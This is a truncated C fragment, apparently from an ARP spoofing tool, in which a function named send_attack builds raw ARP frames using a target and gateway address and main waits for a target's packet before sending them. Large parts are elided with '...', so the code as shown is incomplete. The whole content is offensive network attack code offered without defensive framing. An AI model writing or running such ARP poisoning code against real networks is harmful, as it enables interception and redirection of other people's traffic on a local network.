...
int send_attack(int sfd, int ifindex, struct in_addr *traget, struct in_addr *gatWay, send_arping_t *rbuf)
{
    send_arping_t sbuf;
    int ret, i = 0;
    struct sockaddr_ll to;
    ...
    memcpy(sbuf.ehdr.h_source, rbuf->src_hw, ETH_ALEN);
    sbuf.ehdr.h_proto = htons(ETH_P_ARP);
    sbuf.ahdr.ar_hrd = htons(ARPHRD_ETHER);
    sbuf.ahdr.ar_pro = htons(ETH_P_IP);
    sbuf.ahdr.ar_hln = ETH_ALEN;
...
int main(int c, char **v)
{
    ...
    while (1){
        ...
        if (recv_pack(sfd, &traget, &rbuf))
            continue;
        else 
            break;
    }

    send_attack(sfd, ifindex, &traget, &gatWay, &rbuf);
    return 0;
}
